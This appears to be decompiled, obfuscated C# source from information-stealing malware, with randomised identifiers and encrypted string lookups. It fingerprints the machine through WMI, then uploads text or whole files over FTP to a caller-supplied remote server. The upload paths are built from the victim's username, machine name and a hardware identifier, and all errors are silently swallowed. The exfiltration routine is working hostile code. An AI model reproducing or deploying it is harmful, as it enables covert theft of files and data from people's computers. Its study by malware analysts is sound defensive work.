using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

internal sealed class chuLHDnVuoGm
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string CcLbwvTyIfmg()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107398926));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107398873)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107398888);
			ManagementObject val3 = new ManagementObject(getString_0(107398883) + text2 + getString_0(107399322));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107399317)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107386417) : text;
		}
	}

	public static void qYXzLYoMUQsw(string idnKhYMfvQtk = "URL", string ZGaxyElUpyng = "USERNAME", string GQyBbPYlgxC = "ACCESO", string XCdGUpAMypHSGo = "")
	{
		try
		{
			string text = CcLbwvTyIfmg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(idnKhYMfvQtk + getString_0(107400018) + Environment.UserName + getString_0(107400037) + Environment.MachineName + getString_0(107400016) + text + getString_0(107400011));
			ftpWebRequest.Method = getString_0(107399292);
			ftpWebRequest.Credentials = new NetworkCredential(ZGaxyElUpyng, GQyBbPYlgxC);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(XCdGUpAMypHSGo);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void XEbKwrzWPjZipB(string LSnwAfHZdXo = "URL", string KZzWPLsrkGc = "USERNAME", string rgBepvAuJkkXF = "ACCESO", string RxOFxpJqvnjLJ = "")
	{
		try
		{
			string text = CcLbwvTyIfmg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(LSnwAfHZdXo + getString_0(107400018) + Environment.UserName + getString_0(107400037) + Environment.MachineName + getString_0(107400016) + text + getString_0(107400016) + Path.GetFileName(RxOFxpJqvnjLJ));
			ftpWebRequest.Method = getString_0(107399292);
			ftpWebRequest.Credentials = new NetworkCredential(KZzWPLsrkGc, rgBepvAuJkkXF);
			byte[] array = File.ReadAllBytes(RxOFxpJqvnjLJ);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static chuLHDnVuoGm()
	{
		Strings.CreateGetStringDelegate(typeof(chuLHDnVuoGm));
	}
}
